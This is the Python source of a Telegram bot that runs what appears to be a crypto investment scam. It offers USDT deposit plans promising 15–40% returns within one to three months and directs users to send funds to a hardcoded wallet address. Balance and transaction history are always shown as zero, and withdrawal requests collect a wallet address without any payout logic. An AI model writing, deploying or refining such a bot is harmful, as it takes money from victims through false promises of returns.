
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes
import os

TOKEN = os.getenv("TOKEN")

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton("💵 Deposit", callback_data="deposit")],
        [InlineKeyboardButton("💸 Withdraw", callback_data="withdraw")],
        [InlineKeyboardButton("📊 Balance", callback_data="balance")],
        [InlineKeyboardButton("🧾 Transactions", callback_data="transactions")],
        [InlineKeyboardButton("📞 Contact Support", callback_data="support")],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text("Welcome! Choose an option below:", reply_markup=reply_markup)

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    choice = query.data

    if choice == "deposit":
        options = [
            [InlineKeyboardButton("100 USDT", callback_data="d100")],
            [InlineKeyboardButton("500 USDT", callback_data="d500")],
            [InlineKeyboardButton("1,000 USDT", callback_data="d1000")],
            [InlineKeyboardButton("3,000 USDT", callback_data="d3000")],
            [InlineKeyboardButton("8,000 USDT", callback_data="d8000")],
            [InlineKeyboardButton("15,000 USDT", callback_data="d15000")],
            [InlineKeyboardButton("50,000 USDT", callback_data="d50000")],
            [InlineKeyboardButton("250,000 USDT", callback_data="d250000")],
        ]
        await query.edit_message_text("Choose amount to deposit:", reply_markup=InlineKeyboardMarkup(options))

    elif choice.startswith("d"):
        amount = choice[1:]
        plans = [
            [InlineKeyboardButton("1 Month (+15%)", callback_data=f"loan_{amount}_1")],
            [InlineKeyboardButton("2 Months (+34%)", callback_data=f"loan_{amount}_2")],
            [InlineKeyboardButton("3 Months (+40%)", callback_data=f"loan_{amount}_3")],
        ]
        await query.edit_message_text(
            f"Deposit {amount} USDT selected.\nChoose loan duration:",
            reply_markup=InlineKeyboardMarkup(plans)
        )

    elif choice.startswith("loan_"):
        _, amount, months = choice.split("_")
        bonuses = {"1": 15, "2": 34, "3": 40}
        bonus = bonuses.get(months, 0)
        total = int(amount) + int(amount) * bonus // 100
        await query.edit_message_text(
            f"✅ Deposit: {amount} USDT\n"
            f"⏳ Plan: {months} Month(s)\n"
            f"💰 You will receive: {total} USDT\n\n"
            f"📥 Send USDT to:\n"
            f"`0x0797c9f1b6f3c5c483c4fa54da69652b6a4fb97e`\n"
            f"Supported networks: BEP-20, ETH\n\n"
            f"Once done, wait for confirmation!"
        )

    elif choice == "withdraw":
        await query.edit_message_text(
            "✏️ Please send your USDT wallet address (BEP-20 or ETH).\n"
            "After approval, you’ll receive your funds within 24 hours."
        )

    elif choice == "balance":
        await query.edit_message_text("🧾 Your balance is: 0 USDT")

    elif choice == "transactions":
        await query.edit_message_text("📜 You have no transaction history yet.")

    elif choice == "support":
        await query.edit_message_text("📞 Contact support at: @sharks_mi")

    else:
        await query.edit_message_text("❓ Unknown option. Use the menu buttons.")

app = Application.builder().token(TOKEN).build()
app.add_handler(CommandHandler("start", start))
app.add_handler(CallbackQueryHandler(button_handler))
app.run_polling()
